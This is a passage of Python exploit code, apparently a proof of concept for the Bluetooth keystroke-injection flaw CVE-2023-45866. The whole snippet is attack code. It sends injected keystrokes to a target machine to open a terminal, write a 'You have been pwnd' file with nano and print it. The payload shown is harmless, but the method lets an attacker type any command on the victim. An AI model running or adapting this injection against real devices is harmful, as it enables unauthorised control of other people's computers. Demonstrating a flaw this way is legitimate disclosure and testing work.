...
log.status("opening terminal and nano to write to a text file")
try:
    #Open terminal
    client.send_keypress(Key.LeftControl, Key.LeftAlt, Key.T, Mod.LeftControl, Mod.LeftAlt)
    time.sleep(3)
    log.status("open terminal 3 second delay for terminal to open")
    client.send_ascii("nano SnowdenSentis.txt")
    time.sleep(0.5)
    log.status("nano .txt file")
    client.send_keypress(Key.Enter)
    time.sleep(1)
    client.send_ascii("You have been pwnd and are vulernable to CVE-2023-45866")
    time.sleep(2)
    client.send_keypress(Mod.LeftControl, Key.X)
    time.sleep(1)
    client.send_keypress(Key.Y)
    time.sleep(1)
    client.send_keypress(Key.Enter)
    time.sleep(1)
    log.status("Saved file")
    client.send_ascii("cat SnowdenSentis.txt")
    time.sleep(2)
    client.send_keypress(Key.Enter)
    log.status("print file")
    time.sleep(0.3)
except KeyboardInterrupt:
    log.status("Interrupted while sending keystrokes")
